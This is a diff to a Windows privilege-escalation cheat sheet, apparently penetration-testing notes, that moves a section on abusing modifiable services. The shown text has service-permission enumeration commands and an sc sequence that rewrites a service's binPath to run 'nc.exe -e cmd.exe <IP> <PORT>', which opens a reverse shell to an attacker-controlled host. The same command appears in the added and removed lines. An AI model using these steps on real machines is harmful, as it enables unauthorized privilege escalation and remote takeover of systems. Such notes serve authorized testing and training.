@@ -343,6 +343,13 @@ We can also check the services whose configuration the current user can modify.
 ```powershell
 Get-ModifiableService -Verbose
 ```
+## Modifying the service
+
+Check service permissions with `accesschk` from sysinternals.
+
+```
+accesschk -c <service> -l
+```
 
 There are another Powershell script that dig a little deeper and print which service rights we have.
 
@@ -353,7 +360,15 @@ There are another Powershell script that dig a little deeper and print which ser
 Get-ServiceAcl -Name service-name | select -ExpandProperty Access
 ```
 
-Sometimes services are pointing to writeable folders:
+And finally modify it.
+
+```
+sc stop <service>
+sc config <service> binPath="C:\Temp\nc.exe -e cmd.exe <IP> <PORT>"
+sc qc <service> #Check correct assigment 
+sc start <service>
+```
+
 
 ## Writeable Folders
 
@@ -448,22 +463,6 @@ x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
 i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
 ```
 
-## Modifying the service
-
-Check service permissions with `accesschk` from sysinternals.
-
-```
-accesschk -c <service> -l
-```
-
-And finally modify it.
-
-```
-sc stop <service>
-sc config <service> binPath="C:\Temp\nc.exe -e cmd.exe <IP> <PORT>"
-sc qc <service> #Check correct assigment 
-sc start <service>
-```
 
 # WSL (Windows Subsystem for Linux)
 
